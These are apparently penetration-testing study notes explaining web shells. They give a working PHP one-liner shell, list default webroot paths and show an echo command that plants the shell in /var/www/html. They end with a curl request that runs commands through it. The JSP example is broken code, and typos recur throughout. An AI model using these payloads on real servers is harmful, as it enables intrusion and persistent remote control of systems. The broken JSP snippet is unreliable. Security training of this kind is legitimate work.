The final type of shell we have is a Web Shell is typically a web script,i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters
, executes our command, and prints its output bacj on the web page. 

WRITING A WEB SHELL

For writing a web shell it is necessary to write our web shell that would take our command through a GET request, execute it, and print its output back. A web shell script is typically one-liner that is very 
short and can be memorized easily. The following are some 
common short web shell scripts for common web languages. 

PHP 

<?php system($_REQUEST["cmd"]);?>

JSP 

<% Runtime.getRuntime().exec.getParameter("cmd")); %>

UPLOADING A WEB SEHLL 

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the 
script through the web browser. THis can be through a vulnerability in an upload feature, which would allow us to write one of our shells, i.e. shell.php and upload it, and then access out uploaded file to execute commands.

However if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. 
So, the first step is to identify where the webroot is . The following are the default webroots for common web servers:

Apache	 /var/www/html/
Nginx   /usr/local/nginx/html/
IIS     c:\inetpub\wwwroot\ 
XAMPP   C:\xampp\htdocs\

We can chec these directories to see which is in use and then use echo to write out our web shell. 
For example , if we are attacking a Linux host running Apache, we can write PHP shell with the following command 

$ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

ACCESNG WEB SHELL 
Once we write our web shell, we can either access it through a browser by using cURL. We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command 

Or another alternative is to use cURL

$ curl http://SERVER_IP:PORT/shell.php?cmd=id

